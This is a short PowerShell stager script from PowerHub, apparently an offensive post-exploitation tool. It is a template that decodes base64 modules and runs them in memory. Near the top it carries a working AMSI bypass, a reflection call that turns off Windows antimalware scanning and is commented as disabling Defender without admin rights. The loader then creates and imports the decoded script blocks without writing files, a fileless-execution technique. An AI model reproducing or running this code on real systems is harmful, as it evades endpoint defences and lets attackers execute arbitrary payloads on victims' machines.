# stager.ps1
# Adrian Vollmer, 2018
#
# TODO zip https://blog.kenaro.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/

Write-Host @"
PowerHub [ASCII art]
Run 'Help-PowerHub' for help
"@


Try { # Disables Win10 Defender, no admin required
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] Disabled AMSI"
} Catch {
    Write-Host "[-] Failed to disable AMSI"
}


$Modules = @()
{% if modules %}
{% for m in modules %}
$m = @{}
$m.add('name', '{{ m.name }}')
$m.add('type', '{{ m.type }}')
$m.add('code', '{{ m.code|safe }}')
$Modules += $m
{% endfor %}
{% endif %}


ForEach ($m in $Modules) {
    $b64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($m["code"]))
    # TODO unzip? decrypt?
    Try {
        $sb = [Scriptblock]::Create($b64)
        New-Module -ScriptBlock $sb | Out-Null
        Write-Host ("[*] {0} imported." -f $m["name"])
    } Catch [Exception] {
        Write-Host ("[*] Failed to import {0}" -f $m["name"])
        Write-Host $_.Exception|format-list -force
    }
}


function List-HubModules {
    $Modules | Select -Property name,type
}


function Run-Exe {
    # TODO
}


function Help-PowerHub {
    # TODO
}
